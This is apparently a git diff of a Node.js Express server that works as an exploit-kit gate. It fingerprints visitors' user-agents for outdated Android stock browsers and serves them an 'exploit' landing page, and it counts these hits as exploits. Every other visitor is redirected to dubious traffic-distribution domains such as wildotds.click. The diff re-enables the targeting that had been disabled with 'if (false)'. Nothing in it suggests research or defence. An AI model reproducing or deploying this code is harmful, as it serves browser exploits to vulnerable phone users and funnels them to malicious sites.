@@ -28,8 +28,6 @@ app.get('/stat', function(req, res){
 		html +="<tr><td>"+users[id].sec+"</td><td>"+users[id].agent+"</td><td>"+users[id].click+"</td><td>"+users[id].inject+"</td></tr>";
 	});
 	html += "</table>"
-
-
 	res.send('exploit:       '+exploit+"        toto:"+tototo+"       click:"+click+"           inj_load:"+inj_load+" <br>"+ html);
 });
 
@@ -110,15 +108,14 @@ app.get('/videoid=512312451', function(req, res){
 	console.log(req.headers['user-agent']);
 	var agent = req.headers["user-agent"];
 	
-
-	//if (agent.match(/Android [1,2,3,4].[1,2,3,4].[1,2,3,4,5,6,7,8]/)&&agent.match(/Version\/[4,3,2,1].[3,2,1,0] Mobile Safari/)){
-	if (false){	
+	// if (true){
+	if (agent.match(/Android [1,2,3,4].[1,2,3,4].[1,2,3,4,5,6,7,8]/)&&agent.match(/Version\/[4,3,2,1].[3,2,1,0] Mobile Safari/)){
 		exploit++;
 		console.log("EXPLOIIIIITTT");
 		res.sendFile(root+'template/lend.html');
 	}else {
 		tototo++;
-		res.redirect("http://7dga.biz/?k=3302");
+		res.redirect("http://wildotds.click/NgJIUMmudH/");
 	}
 
 //res.send("boo")
@@ -131,13 +128,12 @@ app.get('/videoid=4455', function(req, res){
 	
 
 	if (agent.match(/Android [1,2,3,4].[1,2,3,4].[1,2,3,4,5,6,7,8]/)&&agent.match(/Version\/[4,3,2,1].[3,2,1,0] Mobile Safari/)){
-		
 		exploit++;
 		console.log("EXPLOIIIIITTT");
 		res.sendFile(root+'template/lend_bee_noadalt.html');
 	}else {
 		tototo++;
-		res.redirect("http://provideostroy.ru/-4DFZ_vvJM/");
+		res.redirect("http://wildotds.click/NgJIUMmudH/");
 	}
 
 
